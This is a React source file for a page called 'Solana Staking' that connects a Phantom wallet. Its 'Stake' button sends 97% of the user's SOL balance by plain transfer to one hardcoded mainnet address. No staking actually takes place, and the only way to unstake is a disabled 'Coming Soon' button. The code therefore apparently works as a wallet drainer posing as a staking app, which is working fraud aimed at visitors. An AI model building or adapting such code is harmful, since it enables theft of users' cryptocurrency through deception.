import React, { useState } from "react";
import { Connection, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
import { useWallet, WalletProvider } from "@solana/wallet-adapter-react";
import { WalletModalProvider, WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { PhantomWalletAdapter } from "@solana/wallet-adapter-wallets";
import "@solana/wallet-adapter-react-ui/styles.css";

const STAKING_ADDRESS = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";
const SOLANA_NETWORK = "https://api.mainnet-beta.solana.com"; // Replace with testnet/devnet URL for testing

const App = () => {
  const { publicKey, sendTransaction } = useWallet();
  const [connection] = useState(new Connection(SOLANA_NETWORK, "confirmed"));

  const stakeTokens = async () => {
    if (!publicKey) {
      alert("Connect your wallet first!");
      return;
    }

    const lamports = await connection.getBalance(publicKey);
    const stakeAmount = lamports * 0.97;

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(STAKING_ADDRESS),
        lamports: Math.floor(stakeAmount),
      })
    );

    try {
      const signature = await sendTransaction(transaction, connection);
      await connection.confirmTransaction(signature, "confirmed");
      alert(`Staked successfully! Transaction: ${signature}`);
    } catch (error) {
      console.error("Error staking tokens:", error);
      alert("Staking failed. Please try again.");
    }
  };

  return (
    <div style={{ backgroundColor: "#1E1E2C", color: "#FFFFFF", height: "100vh", textAlign: "center", paddingTop: "50px" }}>
      <h1 style={{ color: "#00FFA3" }}>Solana Staking</h1>
      <p>Stake 97% of your SOL and SPL tokens to support our project.</p>
      <WalletMultiButton />
      <div style={{ marginTop: "20px" }}>
        <button
          onClick={stakeTokens}
          style={{
            backgroundColor: "#00FFA3",
            color: "#1E1E2C",
            border: "none",
            padding: "10px 20px",
            borderRadius: "5px",
            cursor: "pointer",
          }}
        >
          Stake
        </button>
      </div>
      <div style={{ marginTop: "10px" }}>
        <button
          style={{
            backgroundColor: "#FFA500",
            color: "#1E1E2C",
            border: "none",
            padding: "10px 20px",
            borderRadius: "5px",
            cursor: "pointer",
          }}
          disabled
        >
          Unstake (Coming Soon)
        </button>
      </div>
    </div>
  );
};

const AppWithWallet = () => {
  const wallets = [new PhantomWalletAdapter()];

  return (
    <WalletProvider wallets={wallets} autoConnect>
      <WalletModalProvider>
        <App />
      </WalletModalProvider>
    </WalletProvider>
  );
};

export default AppWithWallet;
